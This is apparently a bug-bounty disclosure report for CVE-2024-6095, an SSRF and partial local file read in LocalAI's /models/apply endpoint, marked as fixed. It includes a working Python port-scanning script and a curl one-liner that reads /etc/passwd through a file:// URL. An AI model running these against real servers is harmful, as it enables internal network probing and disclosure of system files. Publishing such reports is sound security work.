@@ -1,0 +1,60 @@
+Title: SSRF and partial LFI in the /models/apply endpoint in mudler/localai
+
+Proof of Concept: 
+SSRF
+
+Simply send a request to /models/apply endpoint with theurl` parameter in body
+
+Python script below contains PoC:
+
+import requests
+
+# ANSI color codes
+RED = '\033[0;31m'
+GREEN = '\033[0;32m'
+NC = '\033[0m'  # No Color
+
+# Top 50 ports
+top_http_ports = [80, 8080, 443, 8000, 8008, 8081, 8888, 8880, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8009, 8010, 8011, 8012, 8013, 8014, 8015, 8016, 8017, 8018, 8019, 8020, 8021, 8022, 8023, 8024, 8025, 8026, 8027, 8028, 8029, 8030, 8031, 8032, 8033, 8034, 8035, 8036, 8037, 8038, 8039, 8040, 8041, 8042, 8043, 8044, 8045, 8046, 8047]
+
+for port in top_http_ports:
+    # Change this variable according to your desired IP or DOMAIN
+    url = f"http://192.168.1.100:{port}/"
+    
+    response = requests.post("http://192.168.1.100:8080/models/apply", json={"url": url}).json()
+    uuid = response.get('uuid')
+    
+    job_response = requests.get(f"http://192.168.1.100:8080/models/jobs/{uuid}").text
+    
+    if "connection refused" in job_response:
+        print(f"{RED}Port {port} (UUID = {uuid}) is closed{NC}")
+    else:
+        print(f"{GREEN}Port {port} (UUID = {uuid}) is listening{NC}")
+
+LFI
+
+As I said earlier, the output is limited for reading, use the next command:
+
+curl -s $(curl -s "http://192.168.1.100:8080/models/apply" -H "Content-Type: application/json" -d "{\"url\": \"file:///etc/passwd\"}" | jq -r '.status') | jq
+
+Impact: 
+This vulnerability could be exploited by a malicious actor to gain unauthorized access to internal HTTP(s) servers and partial read local files.
+
+CVE ID: CVE-2024-6095
+Status: (published)
+Vulnerability Type: CWE-918: Server-Side Request Forgery (SSRF)
+Severity: Medium (5.8)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Changed
+Confidentiality: Low
+Integrity: None
+Availability: None
+Registry: Other
+Affected Version: 2.15.0
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $75
+Fix Bounty: $18.75
